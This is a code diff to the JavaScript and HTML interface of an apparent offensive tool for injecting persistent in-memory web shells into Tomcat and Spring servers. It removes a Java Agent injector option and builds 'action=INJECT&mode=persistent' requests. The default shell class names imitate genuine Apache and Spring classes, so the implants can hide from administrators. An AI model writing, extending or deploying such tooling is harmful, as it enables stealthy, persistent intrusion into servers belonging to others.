@@ -204,7 +204,6 @@
             <option value="tomcat_servlet">Tomcat - Servlet MemoryShell</option>
             <option value="tomcat_valve">Tomcat - Valve MemoryShell</option>
             <option value="spring_interceptor">Spring - Interceptor MemoryShell</option>
-            <option value="java_agent">Java Agent - Runtime Injector</option>
         </select>
     </div>
     
@@ -246,8 +245,7 @@
         tomcat_filter: "org.apache.catalina.filters.LogFilterOverride",
         tomcat_servlet: "org.apache.catalina.servlets.DefaultStatusServlet",
         tomcat_valve: "org.apache.catalina.valves.LogValidationValve",
-        spring_interceptor: "org.springframework.web.servlet.handler.WebMvcSecurityInterceptor",
-        java_agent: "com.sun.tools.attach.AgentClassLoader"
+        spring_interceptor: "org.springframework.web.servlet.handler.WebMvcSecurityInterceptor"
     };
 
     function updateDefaultConfig() {
@@ -298,7 +296,6 @@
         const shellType = document.getElementById('shellType').value;
         const urlPattern = document.getElementById('urlPattern').value;
         const className = document.getElementById('className').value;
-        const base64EncodedJavaSource = btoa(unescape(encodeURIComponent(textarea.value)));
 
         const szParamStr = "action=INJECT&mode=persistent&shellType=" + shellType + "&urlPattern=" + encodeURIComponent(urlPattern) + "&className=" + className;
 
